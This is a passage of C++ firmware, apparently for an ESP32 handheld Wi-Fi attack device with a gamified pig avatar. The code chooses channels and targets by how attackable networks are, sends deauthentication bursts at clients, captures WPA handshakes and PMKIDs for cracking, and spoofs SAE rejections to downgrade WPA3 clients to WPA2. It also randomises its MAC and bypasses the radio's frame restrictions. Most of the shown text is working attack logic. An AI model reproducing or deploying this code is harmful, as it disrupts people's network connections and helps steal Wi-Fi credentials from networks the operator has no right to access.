// gamma controls forgetting rate -- lower = forget faster, higher = remember longer.
// Half-life (ticks) = ln(2) / ln(1/gamma). Multiply by tick cadence for seconds.
//   CAMP  (250ms ticks): gamma=0.998 -> half-life = 346 ticks x 0.25s = 87s
//   PATROL (100ms ticks): gamma=0.995 -> half-life = 139 ticks x 0.1s = 14s
// Per-behavior gamma: controls forgetting rate
// CAMP:   0.998 -> half-life 346 ticks x 250ms = 87s (deep memory)
// PATROL: 0.995-0.997 -> velocity-adaptive (walk speed -> faster forget)
// SPRINT: 0.990 -> half-life ~69 ticks x 80ms = 5.5s (fast forget, pure discovery)
// LURK:   0.999 -> half-life 693 ticks x 300ms = 208s (near-permanent, locked target)

// ==[ BEHAVIOR PARAMS ]== centralized per-state getters
static float getGamma() {
    switch (currentBehavior) {
        case HuntBehavior::CAMP:    return DUCB_GAMMA_CAMP;
        case HuntBehavior::PATROL: {
            // velocity-adaptive: slow walk = remember more, fast walk = forget faster
            float sps = Pedometer::getStepsPerSecond();
            float t = fminf(sps / PATROL_SPS_NORMALIZE, 1.0f);  // 0 -> slow, 1 -> fast
            return DUCB_GAMMA_PATROL_SLOW - t * (DUCB_GAMMA_PATROL_SLOW - DUCB_GAMMA_PATROL_FAST);
        }
        case HuntBehavior::SPRINT:  return DUCB_GAMMA_SPRINT;
        case HuntBehavior::LURK:    return DUCB_GAMMA_LURK;
        default:                    return DUCB_GAMMA_CAMP;  // safety default: use CAMP params
    }
}

static uint32_t getTickMs() {
    switch (currentBehavior) {
        case HuntBehavior::CAMP:    return TICK_MS_CAMP;
        case HuntBehavior::PATROL:  return TICK_MS_PATROL;
        case HuntBehavior::SPRINT:  return TICK_MS_SPRINT;
        case HuntBehavior::LURK:    return TICK_MS_LURK;
        default:                    return TICK_MS_CAMP;  // safety default: use CAMP params
    }
}

// ==[ RECON -> D-UCB PRIOR ]== light bias from Spectrum reconnaissance
static constexpr uint32_t RECON_MAX_AGE_MS = 15UL * 60UL * 1000UL;  // 15 minutes
static constexpr uint8_t RECON_PRIOR_PULLS = 3;                     // small prior to avoid poisoning
static constexpr float RECON_ACTIVITY_SCALE = 30.0f;                // frames/sec for full score
static constexpr float RECON_NETWORK_SCALE = 20.0f;                 // networks for full score
static constexpr float RECON_ATTACKABLE_SCALE = 10.0f;              // attackable networks for full score
static constexpr int8_t RECON_RSSI_MIN = -90;
static constexpr int8_t RECON_RSSI_MAX = -30;
static uint32_t lastReconAppliedMs = 0;

struct ChannelArm {
    float dPulls;           // discounted pull count (D-UCB, Garivier & Moulines 2011)
    float dRewards;         // discounted reward sum
    float partialBonus;     // partial handshake bonus — decays via gamma
};
// ==[ UNIFIED ARMS ]== single array in DRAM. shared knowledge across all behaviors.
static ChannelArm channelArms[14];  // [0] unused, [1-13] = channels
static float totalDPulls = 0.0f;
static uint16_t channelFirstReward = 0;  // bitmask: channels with first reward (UI)
// exposure ticks approximate pulls by time spent on-channel (mode-specific cadence)
static uint32_t lastExposureTick = 0;
// exploit tracking: triggers mood event when same channel selected 3x in a row
static uint8_t ducbLastBestChannel = 0;
static uint8_t ducbSameChannelCount = 0;
// ==[ ADAPTIVE ALPHA ]== exploration weight decays per location epoch
static uint32_t ducbTLocal = 0;         // ticks since last location-change reset
static std::atomic<uint16_t> noveltyNovel{0};     // new-this-window BSSIDs
static std::atomic<uint32_t> noveltyTotal{0};     // total beacons this window
static uint32_t lastNoveltyCheck = 0;   // timestamp of last novelty evaluation
// ==[ BURST TRACKING ]== OPT-6: rapid new-BSSID burst detection
static std::atomic<uint8_t> burstNewCount{0};    // new BSSIDs in current burst window
static uint32_t burstWindowStart = 0;  // start of current 5s burst window
static void tickChannelExposure(uint32_t now);
static void applyReconPrior();

using Gfx::clamp01;

// Target value: reward shaping by auth/capture status. [0, 1]
static float getTargetValue(const DetectedNetwork* net) {
    if (net->hasHandshake) return 0.0f;  // already captured -- zero residual value
    if (net->hasPMKID) return TV_HAS_PMKID;     // have PMKID, handshake still useful

    float authValue;
    switch (net->authmode) {
        case WIFI_AUTH_WPA2_PSK:       authValue = TV_WPA2_PSK; break;
        case WIFI_AUTH_WPA_WPA2_PSK:   authValue = TV_WPA_WPA2_PSK; break;
        case WIFI_AUTH_WPA2_WPA3_PSK:
            authValue = net->hasPMF ? TV_TRANSITION_PMF : TV_TRANSITION_NO_PMF; break;
        case WIFI_AUTH_WPA3_PSK:       authValue = TV_WPA3_PSK; break;  // SAE downgrade only
        default:                       authValue = TV_DEFAULT; break;
    }

    // PMF penalty for non-transition targets (deauth won't work, no PMKID fallback)
    if (net->hasPMF && net->authmode != WIFI_AUTH_WPA2_WPA3_PSK) {
        authValue *= TV_PMF_PENALTY;
    }

    // OPT-4: probe-response feedback -- adjust value based on probe results
    if (net->probeAttempts > 0) {
        if (net->gotResponse && !net->gotPMKIDResponse) {
            authValue *= TV_PROBE_RESPONSIVE;  // responsive AP = higher capture probability
        } else if (!net->gotResponse && net->probeAttempts >= 2) {
            authValue *= TV_PROBE_UNRESPONSIVE;  // unresponsive after 2+ probes = likely unreachable
        }
    }
    return fminf(authValue, 1.0f);
}

// CQS: composite score for a channel based on observable network quality
static float computeChannelQuality(uint8_t ch, uint32_t now) {
    float score = 0.0f;
    float count = 0.0f;

    for (uint16_t i = 0; i < networkCount; i++) {
        if (networks[i].channel != ch) continue;

        float tv = getTargetValue(&networks[i]);
        float rssiNorm = clamp01((networks[i].rssi + CQ_RSSI_OFFSET) / CQ_RSSI_RANGE);
        float age = (float)(now - networks[i].lastSeen) / CQ_AGE_SCALE;
        float freshness = fmaxf(0.0f, 1.0f - age);
        float clientFactor;
        if (networks[i].clientCount > 0) {
            clientFactor = 1.0f;
        } else if (networks[i].authmode == WIFI_AUTH_WPA2_WPA3_PSK ||
                   networks[i].authmode == WIFI_AUTH_WPA2_PSK) {
            // clientless but probeable for PMKID -- reduced, not zero
            clientFactor = (networks[i].probeAttempts >= 3) ? 0.0f : CQ_CLIENTLESS_PMKID_FACTOR;
        } else {
            clientFactor = 0.0f;  // clientless + no PMKID path = zero dwell value
        }

        score += tv * rssiNorm * freshness * clientFactor;
        count += 1.0f;
    }

    if (count <= 0.0f) return 0.0f;

    float avgNet = score / count;
    float density = log2f(1.0f + count) / log2f(1.0f + CQ_DENSITY_REF);
    return avgNet * (0.5f + 0.5f * fminf(density, 1.0f));
}

// ==[ PROBE STATE ]==
static ProbeState probeState = ProbeState::IDLE;
static DetectedNetwork* probeTarget = nullptr;
static uint32_t probeStateTimer = 0;
static uint16_t probeCount = 0;
static std::atomic<bool> pmkidExtracted{false};        // set by callback, checked by probe FSM
static std::atomic<bool> authResponseReceived{false};  // Open System auth seq 2 from AP
static constexpr uint32_t AUTH_WAIT = 400;              // ms to wait for auth response (some APs slow)

// ==[ DEAUTH STATE (MUDBALL) ]==
static DeauthState deauthState = DeauthState::IDLE;
static DetectedNetwork* deauthTarget = nullptr;
static uint8_t deauthClientIdx = 0;
static uint32_t deauthStateTimer = 0;
static uint16_t deauthCount = 0;
static uint32_t lastDeauthTime = 0;
static uint8_t lastAttackTier = 0;  // 0=deauth, 1=eapol, 2=flood

// ==[ ADAPTIVE TIMING ]== behavior-specific intervals (4-state FSM)
static uint32_t getDeauthInterval() {
    // LURK = aggressive focused attack
    if (currentBehavior == HuntBehavior::LURK) {
        return DEAUTH_INTERVAL_LURK;
    }
    // SPRINT: deauth disabled (pure discovery), return huge interval
    if (currentBehavior == HuntBehavior::SPRINT) {
        return DEAUTH_INTERVAL_SPRINT;
    }

    bool angry = Config::getDeauthAggressive();
    uint32_t baseInterval;
    if (currentBehavior == HuntBehavior::CAMP) {
        baseInterval = angry ? DEAUTH_INTERVAL_CAMP_ANGRY : DEAUTH_INTERVAL_CAMP_NORMAL;
    } else {
        baseInterval = angry ? DEAUTH_INTERVAL_PATROL_ANGRY : DEAUTH_INTERVAL_PATROL_NORMAL;
    }

    // Phase C: mood multiplier - faster attacks when hyped
    float multiplier = Mood::getEffectivenessMultiplier();
    return (uint32_t)(baseInterval / multiplier);
}
static uint32_t getProbeInterval() {
    switch (currentBehavior) {
        case HuntBehavior::CAMP:    return PROBE_INTERVAL_CAMP;   // aggressive probing
        case HuntBehavior::PATROL:  return PROBE_INTERVAL_PATROL;   // balanced
        case HuntBehavior::SPRINT:  return PROBE_INTERVAL_SPRINT;   // minimal probing
        case HuntBehavior::LURK:    return PROBE_INTERVAL_LURK;   // focused on locked target
    }
    return PROBE_INTERVAL_CAMP;
}

// ==[ PROBED HASHES ]== replaced by per-network probeAttempts (OPT-1)

// ==[ DEAUTH CACHE ]== client MAC + BSSID combos with cooldown (OPT-5)
struct DeauthCacheEntry { uint32_t hash; uint32_t timestamp; };
// PSRAM-backed (saves ~2KB DRAM)
static DeauthCacheEntry* deauthCache = nullptr;
static uint16_t deauthedCount = 0;

// ==[ PARTIAL HANDSHAKE RETRY QUEUE ]== M1-only gets another mudball
struct RetryTarget {
    uint8_t bssid[6];
    uint8_t station[6];
    uint32_t queuedTime;
    uint8_t attempts;
    bool active;
};
static RetryTarget retryQueue[MAX_RETRY_QUEUE];
static uint8_t retryCount = 0;

// ==[ TIMING ]==
static uint32_t lastHopTime = 0;
static uint32_t postDeauthDwellStart = 0;  // deauth dwell uses elapsed time, not future lastHopTime
static uint32_t lastProbeTime = 0;
static constexpr uint32_t PROBE_WINDOW = 500;       // wait for response
static constexpr uint32_t CHANNEL_SETTLE = 50;      // after hop
// ==[ SESSION STATS ]==
static std::atomic<uint16_t> sessionPMKIDs{0};  // incremented from callback
static uint16_t sessionHandshakes = 0;
static uint32_t sessionStartMillis = 0;  // millis() at Hunt::start()

// ==[ CAPTURE COMBO ]== escalating pitch within 60s window
static uint32_t lastCaptureTime = 0;
static uint8_t captureComboCount = 0;
static constexpr uint32_t COMBO_WINDOW = 60000;  // 60s

// ==[ NETWORK CHURN ]==
static std::atomic<uint32_t> lastNetworkSeen{0};     // time of last beacon
static uint32_t deadAirStart = 0;          // when we entered dead air
static bool inDeadAir = false;             // currently no networks
// ==[ HANDSHAKE TRACKING ]==

// nonce all zeros = invalid SNonce
static bool isNonceZero(const uint8_t* eapolData, uint16_t eapolLen) {
    if (eapolLen < EAPOL_KEY_NONCE_OFFSET + EAPOL_KEY_NONCE_SIZE) return true;
    
    const uint8_t* nonce = eapolData + EAPOL_KEY_NONCE_OFFSET;
    for (int i = 0; i < EAPOL_KEY_NONCE_SIZE; i++) {
        if (nonce[i] != 0) return false;
    }
    return true;
}

struct PendingHandshake {
    uint8_t bssid[6];
    uint8_t station[6];
    char ssid[33];
    EAPOLFrame frames[4];
    uint8_t capturedMask;
    uint32_t firstSeenMs;
    uint32_t lastSeenMs;
    uint32_t completeTimeMs;  // when first valid pair detected (0 = not complete yet)
    uint32_t firstSeenEpoch;
    uint32_t lastSeenEpoch;
    uint32_t frameSeenMs[4];
    bool active;
    bool saved;  // already saved to capture buffer
    bool partialRewardRecorded;  // D-UCB partial reward for M1+M2 (0.3)
    bool retryExhausted;  // MAX_RETRY_ATTEMPTS spent — don't re-queue
    uint8_t captureChannel;        // channel where first EAPOL was seen
    HuntBehavior captureBehavior;  // behavior mode when captured
};

// PSRAM-backed (saves ~26KB DRAM — each entry has EAPOLFrame[4] = 3.3KB)
static PendingHandshake* pendingHandshakes = nullptr;
static std::atomic<uint32_t> trustedEpochBase{0};
static std::atomic<uint32_t> trustedBaseMs{0};

static void refreshTrustedEpochCache(uint32_t nowMs) {
    trustedBaseMs.store(nowMs, std::memory_order_release);
    trustedEpochBase.store(Config::getTrustedEpoch(), std::memory_order_release);
}

static uint32_t getTrustedEpochFromCache(uint32_t nowMs) {
    uint32_t epochBase = trustedEpochBase.load(std::memory_order_acquire);
    if (epochBase == 0) return 0;
    uint32_t baseMs = trustedBaseMs.load(std::memory_order_acquire);
    return epochBase + ((nowMs - baseMs) / 1000);
}

static uint32_t resolveEpochFromAnchor(uint32_t anchorEpoch, uint32_t anchorMs, uint32_t sampleMs) {
    if (anchorEpoch == 0) return 0;
    uint32_t deltaMs = anchorMs - sampleMs;
    uint32_t deltaSec = deltaMs / 1000;
    return (anchorEpoch > deltaSec) ? (anchorEpoch - deltaSec) : 0;
}

// ==[ FWD DECLS ]==
static bool initWiFiPromiscuous();
static void stopWiFiPromiscuous();
static void handleBeacon(const uint8_t* payload, uint16_t len, int8_t rssi, uint8_t rxChannel);
static void handleEAPOL(const uint8_t* payload, uint16_t len, int8_t rssi);
static void handleProbeResponse(const uint8_t* payload, uint16_t len, int8_t rssi);
static void handleProbeRequest(const uint8_t* payload, uint16_t len, int8_t rssi);
static void handleAssocResponse(const uint8_t* payload, uint16_t len, int8_t rssi);
static void trackClientFromData(const uint8_t* payload, uint16_t len, int8_t rssi);
static void hopToNextChannel();
static uint32_t getAdaptiveHopDelay();
static bool selectProbeTarget(bool sameChannelOnly = false);
static bool isEligibleForProbe(const DetectedNetwork* net);
static uint32_t calculateProbeScore(const DetectedNetwork* net);
static DetectedNetwork* findOrCreateNetwork(const uint8_t* bssid);
// deauth helpers
static bool selectDeauthTarget();
static bool isEligibleForDeauth(const DetectedNetwork* net, uint8_t clientIdx);
// isEligibleForSAE removed — C5Monster (DoS) excluded from capture-focused loop
static uint32_t hashClientBSSID(const uint8_t* bssid, const uint8_t* client);
static bool isAlreadyDeauthed(const uint8_t* bssid, const uint8_t* client);
static void markAsDeauthed(const uint8_t* bssid, const uint8_t* client);
// motion-adaptive helpers
static void updateBehavior();
static int8_t getAdaptiveRSSIThreshold();
static uint8_t getDeauthBurstCount(const DetectedClient& client);
// cleanup helpers
static void cleanupStalePending();
static void checkDeadAir();
static void finalizeHandshake(PendingHandshake* pending);
// retry helpers
static void queueRetryDeauth(const uint8_t* bssid, const uint8_t* station);
static bool processRetryQueue();
static void clearRetryForClient(const uint8_t* bssid, const uint8_t* station);
// D-UCB channel selection
static uint8_t selectChannelDUCB();
static void recordChannelReward(uint8_t channel);
static void recordPartialReward(uint8_t channel, float bonus);
static uint32_t fnv1aInit();
static uint32_t fnv1aUpdate(uint32_t hash, const void* data, uint16_t len);
static uint32_t computeBeaconFingerprint(const uint8_t* payload, uint16_t len, bool* wellFormed);
// behavior FSM
static void exitLurk();
static void switchBehavior(HuntBehavior newBehavior);

// promiscuous callback - IRAM_ATTR removed to save ~500 bytes IRAM
// slight perf hit, capture quality unaffected
static void promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (paused) return;
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    int8_t rssi = pkt->rx_ctrl.rssi;
    // hardware-reported channel — more reliable than currentChannel during hop transitions
    uint8_t rxChannel = pkt->rx_ctrl.channel;
    if (rxChannel < 1 || rxChannel > 13) rxChannel = currentChannel;

    if (len < 24) return;  // Too short

    // huntBusy gates non-critical paths (beacons, probe req/resp, client tracking).
    // EAPOL, assoc response, and auth response ALWAYS pass through — the 4-way handshake
    // completes in ~50-200ms; dropping frames during update() kills capture rate.
    bool busy = huntBusy.load(std::memory_order_acquire);

    uint8_t frameType = payload[0];
    uint8_t frameSubtype = (frameType >> 4) & 0x0F;
    frameType = frameType & 0x0C;

    // Management frames
    if (frameType == 0x00) {
        switch (frameSubtype) {
            case 0x08:  // Beacon
                if (!busy) handleBeacon(payload, len, rssi, rxChannel);
                break;
            case 0x04:  // Probe Request (passive harvest)
                if (!busy) handleProbeRequest(payload, len, rssi);
                break;
            case 0x05:  // Probe Response
                if (!busy) handleProbeResponse(payload, len, rssi);
                break;
            case 0x01:  // Association Response — PMKID extraction, never skip
                handleAssocResponse(payload, len, rssi);
                break;
            case 0x0B:  // Authentication — probe auth response, never skip
                // ==[ PROBE AUTH RESPONSE ]== Open System auth seq 2 = AP accepted us
                // Cache probeTarget locally — main thread can null it between the
                // check and the deref. We're on Core 0, so without a local copy the
                // pointer could still be valid at the `!= nullptr` check but null
                // (or freed) by the time we dereference it.
                if (len >= 30 && (probeState == ProbeState::AUTHING || probeState == ProbeState::SENDING)) {
                    DetectedNetwork* target = probeTarget;
                    if (target != nullptr) {
                        uint16_t authAlgo = payload[24] | (payload[25] << 8);
                        uint8_t authSeq = payload[26];
                        uint16_t status = payload[28] | (payload[29] << 8);
                        // Open System, seq 2 (response), status 0 (success), from our target
                        if (authAlgo == 0x0000 && authSeq == 2 && status == 0) {
                            const uint8_t* srcBssid = payload + 10;  // Addr2 = AP
                            if (memcmp(srcBssid, target->bssid, 6) == 0) {
                                authResponseReceived = true;
                            }
                        }
                    }
                }
                // ==[ SAE DOWNGRADE ]== detect SAE auth on transition networks
                // Block WPA3 auth by spoofing AP rejection → client falls back to WPA2
                if (len >= 30 && Config::getSAEAttackEnabled()) {
                    uint16_t authAlgo = payload[24] | (payload[25] << 8);
                    uint8_t authSeq = payload[26];
                    if (authAlgo == 0x0003 && (authSeq == 1 || authSeq == 2)) {
                        // SAE Commit or Confirm from client to AP
                        // Addr1=BSSID(dst), Addr2=Client(src), Addr3=BSSID
                        const uint8_t* dstBssid = payload + 4;
                        const uint8_t* srcClient = payload + 10;
                        // Check if target is a transition mode network (WPA2+WPA3)
                        // Only transition mode benefits from downgrade (pure WPA3 can't fallback)
                        if (!pendingSAEReject.ready) {
                            // O(1) hash lookup instead of O(n) linear scan
                            uint16_t si = hashFindNetwork(dstBssid);
                            bool isTransition = (si != HUNT_HASH_EMPTY &&
                                                 networks[si].authmode == WIFI_AUTH_WPA2_WPA3_PSK);
                            if (isTransition) {
                                memcpy(pendingSAEReject.bssid, dstBssid, 6);
                                memcpy(pendingSAEReject.client, srcClient, 6);
                                pendingSAEReject.authSeq = authSeq;
                                pendingSAEReject.ready = true;
                            }
                        }
                    }
                }
                break;
            // Deauth/disassoc: intentionally ignored during HUNT — MUDBALL TX echoes
            // pollute Recon/paranoia. Suspicious frames are sniffed by Recon outside hunt.
        }
    }
    // Data frames
    else if (frameType == 0x08) {
#if HAMLET_DEBUG_LOG
        dataFramesSeen++;
#endif
        // Track clients from data frames (ToDS or FromDS) — skip when busy
        if (!busy) {
            trackClientFromData(payload, len, rssi);
#if HAMLET_DEBUG_LOG
            dataFramesTracked++;
#endif
        }

        // EAPOL (802.1X auth) — ALWAYS process, never gate on huntBusy.
        // The 4-way handshake M1-M4 completes in ~50-200ms. Dropping even one
        // frame during update() iteration means a missed capture.
        // Calculate LLC/SNAP offset exactly: base 24 + QoS(2) + HTC(4) if present.
        if (len > 40) {
            uint16_t off = 24;
            uint8_t sub = (payload[0] >> 4) & 0x0F;
            if (sub & 0x08) off += 2;                           // QoS Data
            if ((sub & 0x08) && (payload[1] & 0x80)) off += 4;  // HTC (+Order bit)
            if (off + 8 <= len &&
                payload[off]   == 0xAA && payload[off+1] == 0xAA &&
                payload[off+6] == 0x88 && payload[off+7] == 0x8E) {
                handleEAPOL(payload, len, rssi);
            }
        }
    }
}

void start() {
    if (active) return;
    
    // initialize
    huntBusy.store(false, std::memory_order_release);  // reset race flag
    esp_wifi_get_mac(WIFI_IF_STA, ourStaMac);  // cache STA MAC for callback use
    pendingPMKID.ready = false;
    authResponseReceived = false;
    pendingBeacon.ready = false;
    if (!pendingBeacon.data) {
        pendingBeacon.data = (uint8_t*)heap_caps_malloc(BEACON_MAX_STAGE_LEN, MALLOC_CAP_SPIRAM);
    }
    // D-UCB arms: DRAM array (no PSRAM indirection needed)
    for (size_t i = 0; i < sizeof(pendingBeaconFreeQueue) / sizeof(pendingBeaconFreeQueue[0]); i++) {
        pendingBeaconFreeQueue[i].store(nullptr, std::memory_order_relaxed);
    }
    // reset deferred Mood/Avatar/retry flags
    pendingNewNetwork = false;
    pendingNewNetworkSSID.store(false, std::memory_order_relaxed);
    pendingClientSpotted = false;
    pendingHSProgress = false;
    pendingNeedM2 = 0;
    pendingClearRetry = false;
    pendingPartialReward = false;
    pendingClientQueueCount.store(0, std::memory_order_relaxed);
    karmaRingHead = 0;
    karmaRingCount = 0;
    pendingKarmaCheck = false;
    memset(karmaRing, 0, sizeof(karmaRing));
    networkCount = 0;
    // ==[ PSRAM ALLOC ]== big arrays live in PSRAM to spare DRAM
    if (!networks) {
        networks = (DetectedNetwork*)heap_caps_calloc(
            MAX_HUNT_NETWORKS, sizeof(DetectedNetwork), MALLOC_CAP_SPIRAM);
    } else {
        memset(networks, 0, sizeof(DetectedNetwork) * MAX_HUNT_NETWORKS);
    }
    if (!pendingHandshakes) {
        pendingHandshakes = (PendingHandshake*)heap_caps_calloc(
            MAX_PENDING_HANDSHAKES, sizeof(PendingHandshake), MALLOC_CAP_SPIRAM);
    } else {
        memset(pendingHandshakes, 0, sizeof(PendingHandshake) * MAX_PENDING_HANDSHAKES);
    }
    if (!deauthCache) {
        deauthCache = (DeauthCacheEntry*)heap_caps_calloc(
            DEAUTH_CACHE_SIZE, sizeof(DeauthCacheEntry), MALLOC_CAP_SPIRAM);
    }
    if (!networkHashTable) {
        networkHashTable = (uint16_t*)heap_caps_malloc(
            sizeof(uint16_t) * HUNT_HASH_SIZE, MALLOC_CAP_SPIRAM);
    }
    if (networkHashTable) memset(networkHashTable, 0xFF, sizeof(uint16_t) * HUNT_HASH_SIZE);
    if (!harvestedProbes) {
        harvestedProbes = (Hunt::HarvestedProbe*)heap_caps_calloc(
            MAX_HARVESTED_PROBES, sizeof(Hunt::HarvestedProbe), MALLOC_CAP_SPIRAM);
    } else {
        memset(harvestedProbes, 0, sizeof(Hunt::HarvestedProbe) * MAX_HARVESTED_PROBES);
    }
    probeCount = 0;
    sessionPMKIDs = 0;
    sessionHandshakes = 0;
    sessionStartMillis = millis();
    refreshTrustedEpochCache(sessionStartMillis);
    probeState = ProbeState::IDLE;

    // reset capture combo
    lastCaptureTime = 0;
    captureComboCount = 0;
    SFX::resetComboPitch();

    // reset deauth state
    deauthState = DeauthState::IDLE;

    // reset behavior FSM
    lurkActive = false;
    lurkRSSILostTime = 0;
    transitionDebounce = 0;
    pendingBehavior = HuntBehavior::CAMP;
    deauthTarget = nullptr;
    deauthCount = 0;
    deauthedCount = 0;
    
    // reset dead air tracking
    lastNetworkSeen = millis();
    inDeadAir = false;
    
    // initialize behavior based on current motion
    MotionState initialMotion = Pedometer::getMotionState();
    motionStationary = (initialMotion != MotionState::WALKING);
    currentBehavior = (initialMotion == MotionState::WALKING)
                      ? HuntBehavior::PATROL : HuntBehavior::CAMP;
    // HUNT owns a 60fps animated street in every behavior. Keep the profile's
    // FAST clock; stationary radio savings come from TX scaling, not UI stalls.
    Power::setCpuFrequency(Power::CpuFreq::FAST);
    
    memset(channelStats, 0, sizeof(channelStats));
    if (harvestedProbes) memset(harvestedProbes, 0, sizeof(Hunt::HarvestedProbe) * MAX_HARVESTED_PROBES);
    harvestedCount = 0;
    totalProbeRequests = 0;
    treeVisible = false;
    channelHopping = true;
    if (deauthCache) memset(deauthCache, 0, sizeof(DeauthCacheEntry) * DEAUTH_CACHE_SIZE);
    memset(retryQueue, 0, sizeof(retryQueue));
    retryCount = 0;
    
    // Reset D-UCB arms — always fresh each session for warwalking.
    // NVS rewards kept for lifetime stats, not used for D-UCB decisions.
    memset(channelArms, 0, sizeof(channelArms));
    totalDPulls = 0.0f;
    ducbTLocal = 0;
    noveltyNovel = 0;
    noveltyTotal = 0;
    lastNoveltyCheck = 0;
    burstNewCount = 0;
    burstWindowStart = 0;
    channelFirstReward = 0;
    // Reset exploit tracking so mode restart doesn't trigger spurious mood events
    ducbLastBestChannel = 0;
    ducbSameChannelCount = 0;
    applyReconPrior();

    // Initialize coordination - use configured role
    coordinationEnabled = true;
    coordinationRole = Config::getCoordinationRole(); // Use configured role

    assignedChannel = 0;
    assignedUntil = 0;
    memset(priorityAdjustments, 0, sizeof(priorityAdjustments));

    // bail if critical PSRAM allocs failed — promiscuous callback would null-deref
    if (!networks || !networkHashTable) {
        HAMLET_LOGLN("[HUNT] PSRAM alloc failed — hunt disabled");
        active = false;
        return;
    }

    // randomize MAC
    WSLBypasser::randomizeMAC();

    // start WiFi promiscuous mode
    if (!initWiFiPromiscuous()) {
        active = false;
        paused = false;
        return;
    }

    // prime exposure ticking so the initial channel gets sampled immediately
    lastExposureTick = millis();
    uint32_t tickMs = getTickMs();
    if (lastExposureTick > tickMs) lastExposureTick -= tickMs;
    
    active = true;
    paused = false;
    lastHopTime = millis();
    postDeauthDwellStart = 0;  // no dwell active on fresh start
    lastProbeTime = millis() - getProbeInterval() + FIRST_PROBE_DELAY;  // first probe after 2s
    lastDeauthTime = millis();  // first deauth after DEAUTH_INTERVAL
    
    // trigger hunt animation - pig walks, grass moves
    Mood::onHuntStart();
    Avatar::waveRipple(WaveMode::INCOMING);

    // show tree in CAMP mode only if attackable networks with clients exist
    if (currentBehavior == HuntBehavior::CAMP && !Weather::isTreeSuppressed()) {
        uint8_t fruits = getTreeFruitCount();
        if (fruits > 0) {
            Avatar::showTree(fruits);
            treeVisible = true;
        }
    }
}

void stop() {
    if (!active) return;
    
    // set busy flag before touching networks; callbacks play nice
    huntBusy.store(true, std::memory_order_release);

    // kill promiscuous FIRST — no more callbacks touching our buffers
    stopWiFiPromiscuous();

    // drain deferred ops before teardown
    pendingPMKID.ready = false;
    pendingBeacon.ready = false;
    if (pendingBeacon.data) {
        heap_caps_free(pendingBeacon.data);
        pendingBeacon.data = nullptr;
    }
    drainBeaconFrees();

    // free beacon frames to prevent PSRAM dribble on restart
    if (networks) {
        for (uint16_t i = 0; i < networkCount; i++) {
            if (networks[i].beaconFrame) {
                heap_caps_free(networks[i].beaconFrame);
                networks[i].beaconFrame = nullptr;
            }
        }
    }

    // Mark ESP-NOW for reinitialization (WiFi was stopped)
    NowFlock::markEspNowNeedsReinit();

    // ==[ SD SESSION DUMP ]== read networks BEFORE freeing PSRAM
    {
        SDStorage::SessionStats ss = {};
        ss.timestamp = getCurrentEpoch();
        ss.durationSec = (millis() - sessionStartMillis) / 1000;
        ss.pmkids = sessionPMKIDs;
        ss.handshakes = sessionHandshakes;
        ss.networksFound = networkCount;
        ss.clientsFound = 0;
        if (networks) {
            for (uint16_t i = 0; i < networkCount; i++) {
                ss.clientsFound += networks[i].clientCount;
            }
        }
        ss.probesSent = probeCount;
        ss.deauthsSent = deauthCount;
        ss.steps = Pedometer::getSteps();
        for (uint8_t ch = 0; ch < 13; ch++) {
            ss.channelStats[ch] = channelStats[ch + 1].pmkidHits
                                + channelStats[ch + 1].handshakeHits;
        }
        SDStorage::dumpSessionStats(ss);
    }

    // ==[ FREE PSRAM ]== reclaim hunt buffers
    if (networks)          { heap_caps_free(networks);          networks = nullptr; }
    if (pendingHandshakes) { heap_caps_free(pendingHandshakes); pendingHandshakes = nullptr; }
    if (deauthCache)       { heap_caps_free(deauthCache);       deauthCache = nullptr; }
    if (networkHashTable)  { heap_caps_free(networkHashTable);  networkHashTable = nullptr; }
    if (harvestedProbes)   { heap_caps_free(harvestedProbes);   harvestedProbes = nullptr; }
    harvestedCount = 0;
    totalProbeRequests = 0;
    networkCount = 0;

    active = false;
    huntBusy.store(false, std::memory_order_release);  // release lock after WiFi stopped
    probeState = ProbeState::IDLE;

    // reset coordination state on stop
    coordinationEnabled = false;
    coordinationRole = Config::getCoordinationRole(); // Use configured role when not hunting
    assignedChannel = 0;
    assignedUntil = 0;
    memset(priorityAdjustments, 0, sizeof(priorityAdjustments));

    // stop hunt animation - grass halts, pig sulks in idle
    Mood::onHuntStop();
    Avatar::waveRipple(WaveMode::NONE);
    if (treeVisible) {
        Avatar::hideTree();
        treeVisible = false;
    }
}

void update() {
    if (!active || paused || !wifiInitOK) return;

    uint32_t now = millis();
    refreshTrustedEpochCache(now);

    // ==[ RACE GUARD ]== lock networks[] while we iterate
    huntBusy.store(true, std::memory_order_release);

    // track exposure on the current channel for the current behavior
    tickChannelExposure(now);

    // combo pitch expiry: reset after 60s of no captures
    if (captureComboCount > 0 && lastCaptureTime > 0 && (now - lastCaptureTime >= COMBO_WINDOW)) {
        captureComboCount = 0;
        SFX::resetComboPitch();
    }

    // TX + EAPOL diagnostics — log every 10s
#if HAMLET_DEBUG_LOG
    static uint32_t lastTxLog = 0;
    if (now - lastTxLog >= 10000) {
        WSLBypasser::logTxStats();
        if (eapolCallbackHits > 0) {
            HAMLET_LOGF("[EAPOL] M1=%u M2=%u M3=%u M4=%u (total=%u)\n",
                          eapolRxM1, eapolRxM2, eapolRxM3, eapolRxM4, eapolCallbackHits);
            eapolRxM1 = eapolRxM2 = eapolRxM3 = eapolRxM4 = eapolCallbackHits = 0;
        }
        // ==[ DEAUTH DIAGNOSTICS ]== are deauths actually firing at real clients?
        {
            uint32_t totalClients = 0;
            for (uint16_t i = 0; i < networkCount; i++) totalClients += networks[i].clientCount;
            HAMLET_LOGF("[DEAUTH] targets=%u miss=%u sent=%u | clients=%u nets=%u | data=%u tracked=%u\n",
                          deauthTargetHits, deauthTargetMiss, deauthClientsSent,
                          totalClients, networkCount,
                          dataFramesSeen, dataFramesTracked);
            deauthTargetHits = deauthTargetMiss = deauthClientsSent = 0;
            dataFramesSeen = dataFramesTracked = 0;
        }
        lastTxLog = now;
    }
#endif
    
    // ==[ DEFERRED SFX + LED ]== callback-safe, non-blocking
    // LED flash provides visual feedback when screen not visible (pocket mode)
    static uint32_t ledOffTime = 0;
    if (pendingHandshakeBeep) {
        pendingHandshakeBeep = false;
        SFX::play(SFX::EAPOL_M4);  // jackpot: arpeggio + Morse GG
        Haptic::doubleTap();        // tactile handshake confirm
        M5.Power.setLed(true);     // LED flash for handshake
        ledOffTime = now + LED_FLASH_HANDSHAKE;    // longer flash for jackpot
    } else if (pendingPMKIDBeep) {
        pendingPMKIDBeep = false;
